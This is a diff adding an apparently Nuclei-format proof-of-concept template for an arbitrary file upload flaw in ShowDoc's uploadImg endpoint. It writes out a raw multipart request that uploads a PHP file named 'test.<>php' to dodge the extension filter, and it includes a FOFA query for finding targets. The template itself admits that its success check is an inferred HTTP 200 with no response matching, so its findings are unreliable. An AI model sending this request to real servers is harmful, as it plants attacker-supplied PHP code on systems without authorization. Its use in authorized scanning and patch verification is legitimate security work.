@@ -1,0 +1,43 @@
+id: poc-57705908aae68b55cada
+info:
+  name: ShowDocPageController存在任意文件上传漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/57705908aae68b55cadab036e2dfc4a1
+
+    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  tags: file-upload,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: 57705908aae68b55cadab036e2dfc4a1
+    fofa: + fofa`app="ShowDoc"`
+http:
+- raw:
+  - 'POST /index.php?s=/home/page/uploadImg HTTP/1.1
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
+
+    Content-Length: 241
+
+    Content-Type: multipart/form-data; boundary=--------------------------921378126371623762173617
+
+    Accept-Encoding: gzip
+
+
+    ----------------------------921378126371623762173617
+
+    Content-Disposition: form-data; name="editormd-image-file"; filename="test.<>php"
+
+    Content-Type: text/plain
+
+
+    <?php phpinfo();?>
+
+    ----------------------------921378126371623762173617--'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
